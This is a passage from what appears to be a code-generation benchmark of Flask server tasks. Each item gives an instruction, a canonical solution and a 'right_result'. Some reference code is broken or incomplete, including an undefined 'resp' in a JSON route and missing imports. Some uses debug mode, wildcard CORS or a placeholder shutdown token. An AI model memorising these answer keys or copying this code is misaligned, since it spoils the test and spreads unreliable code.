    "right_result": "import os\nimport sqlite3\nimport numpy as np\nimport pickle\nfrom flask import Flask, render_template, request, redirect, url_for\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.linear_model import LogisticRegression\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.db = 'reviews.db'\n        \n        # Load pre-trained classifier and vectorizer\n        with open('clf.pkl', 'rb') as f:\n            self.clf = pickle.load(f)\n        with open('vectorizer.pkl', 'rb') as f:\n            self.vect = pickle.load(f)\n        \n        # Setup routes\n        self.setup_routes()\n\n    def setup_routes(self):\n        @self.app.route('/')\n        def index():\n            return render_template('reviewform.html')\n        \n        @self.app.route('/results', methods=['POST'])\n        def results():\n            review = request.form['review']\n            sentiment, prob = self.classify(review)\n            return render_template('results.html', review=review, sentiment=sentiment, probability=prob)\n        \n        @self.app.route('/feedback', methods=['POST'])\n        def feedback():\n            review = request.form['review']\n            actual_sentiment = int(request.form['actual_sentiment'])\n            self.train(review, actual_sentiment)\n            self.sqlite_entry(review, actual_sentiment)\n            return redirect(url_for('index'))\n\n    def classify(self, document):\n        X = self.vect.transform([document])\n        prob = np.max(self.clf.predict_proba(X))\n        sentiment = 'positive' if self.clf.predict(X)[0] == 1 else 'negative'\n        return (sentiment, float(prob))\n\n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"CREATE TABLE IF NOT EXISTS reviews (review TEXT, sentiment INTEGER)\")\n        c.execute(\"INSERT INTO reviews VALUES (?, ?)\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def run(self):\n        self.app.run(debug=True)\n\nif __name__ == '__main__':\n    classifier = ReviewClassifier()\n    classifier.run()"
  },
  {
    "Task_id": 135,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code sets up a Flask web server with three routes:\n1. '/respond' - Simulates a delayed response based on an input parameter\n2. '/request_type' - Returns the HTTP method used in the request\n3. '/json' - Returns a simple JSON response\n\nInput:\n- For '/respond' route: Query parameter 'time' (in milliseconds)\n- For other routes: No specific input parameters required\n\nOutput:\n- For '/respond': A text response after specified delay with CORS headers\n- For '/request_type': A text response indicating the request method with CORS headers\n- For '/json': A JSON response with a greeting message",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}\n\nif __name__ == '__main__':\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\nfrom datetime import timedelta\n\napp = Flask(__name__)\napp.config['JSONIFY_PRETTYPRINT_REGULAR'] = False\n\n@app.before_request\ndef before_request():\n    request.start_time = time.time()\n\n@app.after_request\ndef after_request(response):\n    if 'Origin' in request.headers:\n        response.headers['Access-Control-Allow-Origin'] = '*'\n        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'\n        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'\n    return response\n\n@app.route('/respond')\ndef respond():\n    delay_ms = int(request.args.get('time', 0))\n    time.sleep(delay_ms / 1000.0)\n    return f\"Response after {delay_ms}ms delay\"\n\n@app.route('/request_type')\ndef request_type():\n    return request.method\n\n@app.route('/json')\ndef json_response():\n    return jsonify({\"message\": \"Hello, JSON!\"})\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles incoming requests, processes them with OpenTelemetry tracing, and returns a response.\n\nFunction Description: The function `server_request` is a Flask route handler that processes GET requests to the \"/server_request\" endpoint. It starts a new OpenTelemetry span for tracing purposes, extracts the request context, collects request attributes, processes the request parameter, and returns a simple response.\n\nInput:\n- request: Flask request object containing HTTP request data\n- request.args.get(\"param\"): Optional query parameter passed in the URL\n\nOutput:\n- Returns a string \"served\" as the HTTP response\n- Side effect: Prints the value of the \"param\" query parameter if present\n- Side effect: Creates OpenTelemetry tracing span with request attributes",
    "Canonical_solution": "from flask import Flask, request\nfrom opentelemetry.instrumentation.wsgi import collect_request_attributes\nfrom opentelemetry.propagate import extract\nfrom opentelemetry.sdk.trace import TracerProvider\nfrom opentelemetry.sdk.trace.export import BatchSpanProcessor, ConsoleSpanExporter\nfrom opentelemetry.trace import SpanKind, get_tracer_provider, set_tracer_provider\n\napp = Flask(__name__)\nset_tracer_provider(TracerProvider())\ntracer = get_tracer_provider().get_tracer(__name__)\nget_tracer_provider().add_span_processor(BatchSpanProcessor(ConsoleSpanExporter()))\n\n@app.route(\"/server_request\")\ndef server_request():\n    with tracer.start_as_current_span(\n        \"server_request\",\n        context=extract(request.headers),\n        kind=SpanKind.SERVER,\n        attributes=collect_request_attributes(request.environ),\n    ):\n        print(request.args.get(\"param\"))\n        return \"served\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request\nfrom opentelemetry import trace\nfrom opentelemetry.trace import SpanKind\nfrom opentelemetry.exporter.jaeger.thrift import JaegerExporter\nfrom opentelemetry.sdk.trace import TracerProvider\nfrom opentelemetry.sdk.trace.export import BatchSpanProcessor\n\napp = Flask(__name__)\n\n# Setup OpenTelemetry tracing\ntrace.set_tracer_provider(TracerProvider())\njaeger_exporter = JaegerExporter(\n    agent_host_name=\"localhost\",\n    agent_port=6831,\n)\ntrace.get_tracer_provider().add_span_processor(BatchSpanProcessor(jaeger_exporter))\n\ntracer = trace.get_tracer(__name__)\n\n@app.route(\"/server_request\")\ndef server_request():\n    param = request.args.get(\"param\")\n    with tracer.start_as_current_span(\"server_request\", kind=SpanKind.SERVER) as span:\n        span.set_attributes({\n            \"http.method\": request.method,\n            \"http.url\": request.url,\n            \"http.scheme\": request.scheme,\n            \"net.host.name\": request.host,\n        })\n        if param:\n            print(f\"Received param: {param}\")\n    return \"served\"\n\nif __name__ == \"__main__\":\n    app.run(port=5000)"
  },
  {
    "Task_id": 138,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes credit card application data and returns a prediction result indicating the probability of approval and a binary decision.\n\nFunction Description: The function implements a prediction endpoint for a credit card approval system. It receives client data in JSON format, processes it through a machine learning model (using pre-loaded `dv` for feature transformation and `model` for prediction), and returns the prediction results including the approval probability and a binary decision.\n\nInput: \n- JSON payload containing client data for credit card application (received via HTTP POST request)\n\nOutput: \n- JSON response containing:\n  - 'get_card_probability': float - Probability of getting the credit card (between 0 and 1)\n  - 'get_card': boolean - Binary decision indicating whether the card is approved (True if probability \u2265 0.5)",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nfrom flask import jsonify\n\napp = Flask('credict-card')\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    client = request.get_json()\n\n    X = dv.transform([client])\n    y_pred = model.predict_proba(X)[0, 1]\n    get_card = y_pred >= 0.5\n\n    result = {\n        'get_card_probability': float(y_pred),\n        'get_card': bool(get_card)\n    }\n\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host='0.0.0.0', port=9696)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/predict', methods=['POST'])\ndef predict():\n    data = request.get_json()\n    X = dv.transform([data])\n    y_pred_proba = model.predict_proba(X)[0, 1]\n    result = {\n        'get_card_probability': float(y_pred_proba),\n        'get_card': bool(y_pred_proba >= 0.5)\n    }\n    return jsonify(result)"
  },
  {
    "Task_id": 139,
    "Instruction": "Task Description: Create a Flask-based API service that handles document ingestion, question answering using a language model, and model downloading functionality.\n\nClass Description: FlaskAPI is a class that encapsulates a Flask web service for document processing and question answering. It provides endpoints for ingesting documents, querying an AI model, and downloading the required model files.\n\nAttributes:\n- app: Flask - The Flask application instance\n- embeddings_model_name: str - Name of the embeddings model to use\n- persist_directory: str - Directory to store persistent data\n- model_type: str - Type of the language model\n- model_path: str - Path to the model file\n- model_n_ctx: str - Context size for the model\n- llm: GPT4All - The language model instance\n\nMethods:\n- __init__() -> None - Initializes the Flask application and sets up CORS\n- _setup_routes() -> None - Defines all API routes and their handlers\n- _load_documents(source_dir: str) -> List[Document] - Loads documents from a directory\n- _load_single_document(file_path: str) -> Document - Loads a single document\n- run() -> None - Starts the Flask server\n- _load_model() -> None - Loads the language model if available\n\nRoute Handlers (internal methods):\n- ingest_data() -> Response - Handles document ingestion (GET /ingest)\n- get_answer() -> Response - Handles question answering (POST /get_answer)\n- download_and_save() -> Response - Handles model downloading (GET /download_model)\n\nThe class integrates with LangChain for document processing and GPT4All for local language model inference, providing a complete API for document-based question answering.",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom flask_cors import CORS\nimport os\nimport glob\nfrom typing import List\nimport requests\nfrom langchain.chains import RetrievalQA\nfrom langchain.embeddings import HuggingFaceEmbeddings\nfrom langchain.callbacks.streaming_stdout import StreamingStdOutCallbackHandler\nfrom langchain.vectorstores import Chroma\nfrom langchain.llms import GPT4All\nfrom constants import CHROMA_SETTINGS\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.embeddings_model_name = os.environ.get(\"EMBEDDINGS_MODEL_NAME\")\n        self.persist_directory = os.environ.get('PERSIST_DIRECTORY')\n        self.model_type = os.environ.get('MODEL_TYPE')\n        self.model_path = os.environ.get('MODEL_PATH')\n        self.model_n_ctx = os.environ.get('MODEL_N_CTX')\n        self.llm = None\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/ingest', methods=['GET'])\n        def ingest_data():\n            source_directory = os.environ.get('SOURCE_DIRECTORY', 'source_documents')\n            print(f\"Loading documents from {source_directory}\")\n            chunk_size = 500\n            chunk_overlap = 50\n            documents = self._load_documents(source_directory)\n            text_splitter = RecursiveCharacterTextSplitter(chunk_size=chunk_size, chunk_overlap=chunk_overlap)\n            texts = text_splitter.split_documents(documents)\n            print(f\"Loaded {len(documents)} documents from {source_directory}\")\n            print(f\"Split into {len(texts)} chunks of text (max. {chunk_size} characters each)\")\n\n            embeddings = HuggingFaceEmbeddings(model_name=self.embeddings_model_name)\n            db = Chroma.from_documents(texts, embeddings, persist_directory=self.persist_directory, client_settings=CHROMA_SETTINGS)\n            db.persist()\n            db = None\n            return jsonify(response=\"Success\")\n\n        @self.app.route('/get_answer', methods=['POST'])\n        def get_answer():\n            query = request.json\n            embeddings = HuggingFaceEmbeddings(model_name=self.embeddings_model_name)\n            db = Chroma(persist_directory=self.persist_directory, embedding_function=embeddings, client_settings=CHROMA_SETTINGS)\n            retriever = db.as_retriever()\n            if self.llm is None:\n                return \"Model not downloaded\", 400    \n            qa = RetrievalQA.from_chain_type(llm=self.llm, chain_type=\"stuff\", retriever=retriever, return_source_documents=True)\n            if query is not None and query != \"\":\n                res = qa(query)\n                answer, docs = res['result'], res['source_documents']\n                source_data = [{\"name\": document.metadata[\"source\"]} for document in docs]\n                return jsonify(query=query, answer=answer, source=source_data)\n            return \"Empty Query\", 400\n\n        @self.app.route('/download_model', methods=['GET'])\n        def download_and_save():\n            url = 'https://gpt4all.io/models/ggml-gpt4all-j-v1.3-groovy.bin'\n            filename = 'ggml-gpt4all-j-v1.3-groovy.bin'\n            models_folder = 'models'\n\n            if not os.path.exists(models_folder):\n                os.makedirs(models_folder)\n            response = requests.get(url, stream=True)\n            total_size = int(response.headers.get('content-length', 0))\n            bytes_downloaded = 0\n            file_path = f'{models_folder}/{filename}'\n            if os.path.exists(file_path):\n                return jsonify(response=\"Download completed\")\n\n            with open(file_path, 'wb') as file:\n                for chunk in response.iter_content(chunk_size=4096):\n                    file.write(chunk)\n                    bytes_downloaded += len(chunk)\n                    progress = round((bytes_downloaded / total_size) * 100, 2)\n                    print(f'Download Progress: {progress}%')\n            callbacks = [StreamingStdOutCallbackHandler()]\n            self.llm = GPT4All(model=self.model_path, n_ctx=self.model_n_ctx, backend='gptj', callbacks=callbacks, verbose=False)\n            return jsonify(response=\"Download completed\")\n\n    def _load_documents(self, source_dir: str) -> List[Document]:\n        all_files = []\n        for ext in LOADER_MAPPING:\n            all_files.extend(glob.glob(os.path.join(source_dir, f\"**/*{ext}\"), recursive=True))\n        return [self._load_single_document(file_path) for file_path in all_files]\n\n    def _load_single_document(self, file_path: str) -> Document:\n        ext = \".\" + file_path.rsplit(\".\", 1)[-1]\n        if ext in LOADER_MAPPING:\n            loader_class, loader_args = LOADER_MAPPING[ext]\n            loader = loader_class(file_path, **loader_args)\n            return loader.load()[0]\n        raise ValueError(f\"Unsupported file extension '{ext}'\")\n\n    def run(self):\n        self._load_model()\n        self.app.run(host=\"0.0.0.0\", debug=False)\n\n    def _load_model(self):\n        filename = 'ggml-gpt4all-j-v1.3-groovy.bin'\n        models_folder = 'models'\n        file_path = f'{models_folder}/{filename}'\n        if os.path.exists(file_path):\n            callbacks = [StreamingStdOutCallbackHandler()]\n            self.llm = GPT4All(model=self.model_path, n_ctx=self.model_n_ctx, backend='gptj', callbacks=callbacks, verbose=False)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, send_file\nfrom flask_cors import CORS\nfrom langchain.document_loaders import PyPDFLoader, TextLoader, CSVLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings import HuggingFaceEmbeddings\nfrom langchain.vectorstores import Chroma\nfrom langchain.chains import RetrievalQA\nfrom gpt4all import GPT4All\nimport os\nfrom typing import List\n\nclass Document:\n    def __init__(self, page_content: str, metadata: dict):\n        self.page_content = page_content\n        self.metadata = metadata\n\nclass FlaskAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.embeddings_model_name = \"all-MiniLM-L6-v2\"\n        self.persist_directory = \"db\"\n        self.model_type = \"gpt4all\"\n        self.model_path = \"models/ggml-gpt4all-j.bin\"\n        self.model_n_ctx = 512\n        self.llm = None\n        self._setup_routes()\n        self.embeddings = HuggingFaceEmbeddings(model_name=self.embeddings_model_name)\n        self.db = None\n\n    def _setup_routes(self):\n        @self.app.route('/ingest', methods=['GET'])\n        def ingest_data():\n            source_dir = \"documents\"\n            if not os.path.exists(source_dir):\n                return jsonify({\"error\": \"Documents directory does not exist\"}), 400\n                \n            documents = self._load_documents(source_dir)\n            if not documents:\n                return jsonify({\"message\": \"No documents found to ingest\"}), 200\n                \n            text_splitter = RecursiveCharacterTextSplitter(chunk_size=500, chunk_overlap=50)\n            texts = text_splitter.split_documents(documents)\n            \n            if os.path.exists(self.persist_directory):\n                self.db = Chroma(persist_directory=self.persist_directory, embedding_function=self.embeddings)\n            else:\n                self.db = Chroma.from_documents(texts, self.embeddings, persist_directory=self.persist_directory)\n                \n            self.db.persist()\n            return jsonify({\"message\": f\"Successfully ingested {len(documents)} documents\"}), 200\n\n        @self.app.route('/get_answer', methods=['POST'])\n        def get_answer():\n            if not self.db:\n                return jsonify({\"error\": \"Database not initialized. Please ingest documents first.\"}), 400\n                \n            if not self.llm:\n                self._load_model()\n                if not self.llm:\n                    return jsonify({\"error\": \"Model not loaded. Please download model or check path.\"}), 400\n            \n            data = request.json\n            query = data.get('query')\n            if not query:\n                return jsonify({\"error\": \"No query provided\"}), 400\n                \n            retriever = self.db.as_retriever(search_kwargs={\"k\": 2})\n            chain = RetrievalQA.from_chain_type(\n                llm=self.llm,\n                chain_type=\"stuff\",\n                retriever=retriever,\n                return_source_documents=True\n            )\n            \n            result = chain(query)\n            answer = result[\"result\"]\n            sources = [doc.metadata.get(\"source\", \"Unknown\") for doc in result.get(\"source_documents\", [])]\n            \n            return jsonify({\n                \"answer\": answer,\n                \"sources\": sources\n            }), 200\n\n        @self.app.route('/download_model', methods=['GET'])\n        def download_and_save():\n            model_url = \"https://example.com/models/ggml-gpt4all-j.bin\"\n            os.makedirs(os.path.dirname(self.model_path), exist_ok=True)\n            \n            try:\n                response = requests.get(model_url, stream=True)\n                response.raise_for_status()\n                \n                with open(self.model_path, 'wb') as f:\n                    for chunk in response.iter_content(chunk_size=8192):\n                        if chunk:\n                            f.write(chunk)\n                            \n                return jsonify({\"message\": \"Model downloaded successfully\"}), 200\n            except Exception as e:\n                return jsonify({\"error\": f\"Failed to download model: {str(e)}\"}), 500\n\n    def _load_documents(self, source_dir: str) -> List[Document]:\n        documents = []\n        for filename in os.listdir(source_dir):\n            file_path = os.path.join(source_dir, filename)\n            try:\n                if filename.endswith('.pdf'):\n                    loader = PyPDFLoader(file_path)\n                    documents.extend(loader.load())\n                elif filename.endswith('.txt') or filename.endswith('.md'):\n                    loader = TextLoader(file_path)\n                    documents.extend(loader.load())\n                elif filename.endswith('.csv'):\n                    loader = CSVLoader(file_path)\n                    documents.extend(loader.load())\n                else:\n                    print(f\"Unsupported file type: {filename}\")\n            except Exception as e:\n                print(f\"Error loading file {filename}: {str(e)}\")\n        \n        return documents\n\n    def _load_single_document(self, file_path: str) -> Document:\n        try:\n            if file_path.endswith('.pdf'):\n                loader = PyPDFLoader(file_path)\n            elif file_path.endswith('.txt') or file_path.endswith('.md'):\n                loader = TextLoader(file_path)\n            elif file_path.endswith('.csv'):\n                loader = CSVLoader(file_path)\n            else:\n                raise ValueError(f\"Unsupported file type: {file_path}\")\n                \n            return loader.load()[0]\n        except Exception as e:\n            raise RuntimeError(f\"Error loading document: {str(e)}\")\n\n    def _load_model(self):\n        try:\n            self.llm = GPT4All(model=self.model_path, n_ctx=self.model_n_ctx)\n        except Exception as e:\n            print(f\"Error loading model: {str(e)}\")\n            self.llm = None\n\n    def run(self):\n        self.app.run(debug=True, host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that converts text to speech (TTS) and returns the generated audio as a WAV file.\n\nFunction Description: The function `tts()` is a Flask route handler that processes GET requests to the '/api/tts' endpoint. It takes text input as a query parameter, synthesizes it into speech using a TTS synthesizer, and returns the audio as a WAV file in the response.\n\nInput: \n- text: [str] (passed as a query parameter 'text' in the GET request) - The text to be converted to speech.\n\nOutput:\n- [Flask Response] - A response containing the synthesized audio in WAV format with the appropriate MIME type ('audio/wav'). The audio data is streamed from memory using a BytesIO buffer.\n\nNote: The function assumes the existence of a pre-initialized `synthesizer` object capable of performing TTS (text-to-speech) conversion and saving the output as WAV format. The actual implementation of the synthesizer is not shown in this reference code.",
    "Canonical_solution": "from flask import Flask, render_template, request, send_file\nimport io\n\napp = Flask(__name__)\n\n@app.route('/api/tts', methods=['GET'])\ndef tts():\n    text = request.args.get('text')\n    print(\" > Model input: {}\".format(text))\n    wavs = synthesizer.tts(text)\n    out = io.BytesIO()\n    synthesizer.save_wav(wavs, out)\n    return send_file(out, mimetype='audio/wav')\n\ndef main():\n    app.run(debug=args.debug, host='0.0.0.0', port=args.port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nfrom io import BytesIO\n\napp = Flask(__name__)\n\n# Assume synthesizer is a pre-initialized object with a synthesize method\n# Example: synthesizer = SomeTTSModel()\n\n@app.route('/api/tts', methods=['GET'])\ndef tts():\n    text = request.args.get('text', '')\n    if not text:\n        return Response(status=400)\n    \n    audio_buffer = BytesIO()\n    synthesizer.synthesize(text, audio_buffer)\n    audio_buffer.seek(0)\n    \n    return Response(audio_buffer.read(), mimetype='audio/wav')"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles various file serving endpoints and a video processing endpoint, with CORS support.\n\nFunction Description: The code implements a Flask web server with multiple routes for serving different types of files (videos, posters, uploads) and processing video streams. It includes health check, file serving, and video propagation endpoints.\n\nInput:\n- For healthy(): None\n- For send_gallery_video(path: str): path parameter as string\n- For send_poster_image(path: str): path parameter as string\n- For send_uploaded_video(path: str): path parameter as string\n- For propagate_in_video(): JSON payload containing session_id and optional start_frame_index\n\nOutput:\n- healthy(): Returns \"OK\" with HTTP status 200\n- send_gallery_video(): Returns file from GALLERY_PATH or raises ValueError\n- send_poster_image(): Returns file from POSTERS_PATH or raises ValueError\n- send_uploaded_video(): Returns file from UPLOADS_PATH or raises ValueError\n- propagate_in_video(): Returns multipart video stream with tracking masks",
    "Canonical_solution": "from flask import Flask, make_response, Request, request, Response, send_from_directory\nfrom flask_cors import CORS\n\napp = Flask(__name__)\ncors = CORS(app, supports_credentials=True)\n\n@app.route(\"/healthy\")\ndef healthy() -> Response:\n    return make_response(\"OK\", 200)\n\n@app.route(f\"/{GALLERY_PREFIX}/<path:path>\", methods=[\"GET\"])\ndef send_gallery_video(path: str) -> Response:\n    try:\n        return send_from_directory(\n            GALLERY_PATH,\n            path,\n        )\n    except:\n        raise ValueError(\"resource not found\")\n\n@app.route(f\"/{POSTERS_PREFIX}/<path:path>\", methods=[\"GET\"])\ndef send_poster_image(path: str) -> Response:\n    try:\n        return send_from_directory(\n            POSTERS_PATH,\n            path,\n        )\n    except:\n        raise ValueError(\"resource not found\")\n\n@app.route(f\"/{UPLOADS_PREFIX}/<path:path>\", methods=[\"GET\"])\ndef send_uploaded_video(path: str):\n    try:\n        return send_from_directory(\n            UPLOADS_PATH,\n            path,\n        )\n    except:\n        raise ValueError(\"resource not found\")\n\n@app.route(\"/propagate_in_video\", methods=[\"POST\"])\ndef propagate_in_video() -> Response:\n    data = request.json\n    args = {\n        \"session_id\": data[\"session_id\"],\n        \"start_frame_index\": data.get(\"start_frame_index\", 0),\n    }\n\n    boundary = \"frame\"\n    frame = gen_track_with_mask_stream(boundary, **args)\n    return Response(frame, mimetype=\"multipart/x-savi-stream; boundary=\" + boundary)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, send_from_directory, request, Response, jsonify\nimport os\nfrom functools import wraps\nimport json\n\napp = Flask(__name__)\n\n# Configuration - Set these paths according to your system setup\nGALLERY_PATH = '/path/to/gallery'\nPOSTERS_PATH = '/path/to/posters'\nUPLOADS_PATH = '/path/to/uploads'\nPROCESSED_VIDEO_PATH = '/path/to/processed_videos'\n\n# Simple CORS decorator\ndef cross_origin(f):\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        resp = f(*args, **kwargs)\n        if isinstance(resp, Response):\n            resp.headers['Access-Control-Allow-Origin'] = '*'\n            resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'\n            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'\n        return resp\n    return decorated_function\n\n@app.route('/healthy', methods=['GET'])\n@cross_origin\ndef healthy():\n    return \"OK\", 200\n\n@app.route('/gallery/<path:path>', methods=['GET'])\n@cross_origin\ndef send_gallery_video(path):\n    try:\n        return send_from_directory(GALLERY_PATH, path)\n    except Exception as e:\n        return str(e), 404\n\n@app.route('/poster/<path:path>', methods=['GET'])\n@cross_origin\ndef send_poster_image(path):\n    try:\n        return send_from_directory(POSTERS_PATH, path)\n    except Exception as e:\n        return str(e), 404\n\n@app.route('/upload/<path:path>', methods=['GET'])\n@cross_origin\ndef send_uploaded_video(path):\n    try:\n        return send_from_directory(UPLOADS_PATH, path)\n    except Exception as e:\n        return str(e), 404\n\n@app.route('/propagate', methods=['POST'])\n@cross_origin\ndef propagate_in_video():\n    data = request.get_json()\n    \n    if not data or 'session_id' not in data:\n        return jsonify({\"error\": \"Missing session_id\"}), 400\n    \n    session_id = data['session_id']\n    start_frame_index = data.get('start_frame_index')\n    \n    # This is a placeholder for the actual video processing logic\n    # For demonstration, we'll just return a success response\n    # In real implementation, this would generate and stream the processed video\n    \n    def generate_video_stream():\n        # Simulate reading from a processed video file\n        video_path = os.path.join(PROCESSED_VIDEO_PATH, f\"{session_id}.mp4\")\n        \n        if not os.path.exists(video_path):\n            yield b''\n            return\n        \n        with open(video_path, 'rb') as video_file:\n            while True:\n                chunk = video_file.read(1024 * 1024)  # Read 1MB at a time\n                if not chunk:\n                    break\n                yield chunk\n    \n    return Response(\n        generate_video_stream(),\n        mimetype='video/mp4',\n        headers={\n            \"Content-Disposition\": \"inline\"\n        }\n    )\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, debug=True)"
  },
  {
    "Task_id": 142,
    "Instruction": "Task Description: Create a RESTful API gateway service using Flask that handles incoming requests, processes them through an MII client, and provides health check and termination endpoints.\n\nClass Description: RestfulGatewayThread is a threaded Flask server implementation that creates and manages a RESTful API gateway for interacting with an MII client. It handles request processing, health checks, and graceful shutdown.\n\nAttributes:\n\n_deployment_name: str - The name of the MII deployment to connect to\n_rest_host: str - The host address to bind the server to\n_rest_port: int - The port number to listen on\n_rest_procs: int - Number of processes to handle requests\n_stop_event: threading.Event - Event flag to track server status\nserver: werkzeug.serving.BaseWSGIServer - The Flask server instance\n\nMethods:\n\n__init__(deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> None - Initializes the thread with server configuration parameters\n_create_server(deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> werkzeug.serving.BaseWSGIServer - Creates and configures the Flask server with routes and resources\n_shutdown() -> None - Handles server shutdown after a configured timeout period\nrun() -> None - Starts the server and runs it indefinitely until shutdown\nget_stop_event() -> threading.Event - Returns the stop event for monitoring server status",
    "Canonical_solution": "from flask import Flask, request, jsonify\nfrom flask_restful import Resource, Api\nfrom werkzeug.serving import make_server\nimport threading\nimport time\nimport mii\nfrom mii.constants import RESTFUL_GATEWAY_SHUTDOWN_TIMEOUT, RESTFUL_API_PATH\n\nclass RestfulGatewayService(Resource):\n    def __init__(self, deployment_name):\n        super().__init__()\n        self.client = mii.client(deployment_name)\n\n    def post(self):\n        data = request.get_json()\n        result = self.client.generate(**data)\n        return jsonify([r.to_msg_dict() for r in result])\n\nclass RestfulGatewayThread(threading.Thread):\n    def __init__(self, deployment_name, rest_host, rest_port, rest_procs):\n        threading.Thread.__init__(self)\n        self._stop_event = threading.Event()\n        self.server = self._create_server(deployment_name, rest_host, rest_port, rest_procs)\n\n    def _create_server(self, deployment_name, rest_host, rest_port, rest_procs):\n        app = Flask(\"RestfulGateway\")\n\n        @app.route(\"/terminate\", methods=[\"GET\"])\n        def terminate():\n            threading.Thread(target=self._shutdown).start()\n            return \"Shutting down RESTful API gateway server\"\n\n        @app.route(\"/healthz\", methods=[\"GET\"])\n        def healthz():\n            return \"ok\"\n\n        api = Api(app)\n        path = \"/{}/{}\".format(RESTFUL_API_PATH, deployment_name)\n        api.add_resource(RestfulGatewayService, path, resource_class_args=(deployment_name,))\n\n        return make_server(rest_host, rest_port, app, threaded=False, processes=rest_procs)\n\n    def _shutdown(self):\n        time.sleep(RESTFUL_GATEWAY_SHUTDOWN_TIMEOUT)\n        self.server.shutdown()\n\n    def run(self):\n        self.server.serve_forever()\n        self._stop_event.set()\n\n    def get_stop_event(self):\n        return self._stop_event",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nfrom threading import Thread, Event\nfrom werkzeug.serving import make_server\nimport json\n\nclass RestfulGatewayThread(Thread):\n    def __init__(self, deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> None:\n        super().__init__()\n        self._deployment_name = deployment_name\n        self._rest_host = rest_host\n        self._rest_port = rest_port\n        self._rest_procs = rest_procs\n        self._stop_event = Event()\n        self.server = self._create_server(deployment_name, rest_host, rest_port, rest_procs)\n\n    def _create_server(self, deployment_name: str, rest_host: str, rest_port: int, rest_procs: int) -> 'werkzeug.serving.BaseWSGIServer':\n        app = Flask(__name__)\n        \n        @app.route('/health', methods=['GET'])\n        def health_check():\n            return jsonify({\"status\": \"healthy\"}), 200\n\n        @app.route('/terminate', methods=['POST'])\n        def terminate():\n            shutdown_token = request.headers.get('X-Shutdown-Token')\n            if shutdown_token == 'secret_token_here':\n                self._stop_event.set()\n                return jsonify({\"message\": \"Shutting down...\"}), 200\n            else:\n                return jsonify({\"error\": \"Unauthorized\"}), 401\n\n        @app.route('/process', methods=['POST'])\n        def process_request():\n            data = request.json\n            mii_client = MIIHttpClient(deployment_name)\n            try:\n                response = mii_client.process(data)\n                return jsonify(response), 200\n            except Exception as e:\n                return jsonify({\"error\": str(e)}), 500\n\n        server = make_server(rest_host, rest_port, app, threaded=True)\n        return server\n\n    def _shutdown(self) -> None:\n        self.server.shutdown()\n\n    def run(self) -> None:\n        self.server.serve_forever()\n\n    def get_stop_event(self) -> 'threading.Event':\n        return self._stop_event"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Flask-based HTTP server that manages and controls multiple learner and collector processes, allowing dynamic scaling of these processes through API calls.\n\nClass Description: FlaskOperatorServer is a class that wraps a Flask application to provide RESTful API endpoints for managing learner and collector process replicas. It interacts with a Creator instance to handle the actual process management.\n\nAttributes:\n- app: Flask - The Flask application instance\n- creator: Creator - The process manager that handles learner and collector instances\n- host: str - The host address where the server will run\n- port: int - The port number where the server will listen\n- api_version: str - The version prefix for API endpoints\n\nMethods:\n- __init__(creator, host: str, port: int, api_version: str = 'v1alpha1') -> None - Initializes the Flask server with process manager, host, port, and API version. Sets up route handlers.\n- run() -> None - Starts the Flask application server on the specified host and port.\n- post_replicas() -> dict - Handles POST requests to set the desired number of replicas (route: /{api_version}/replicas). Returns a response dictionary.\n- 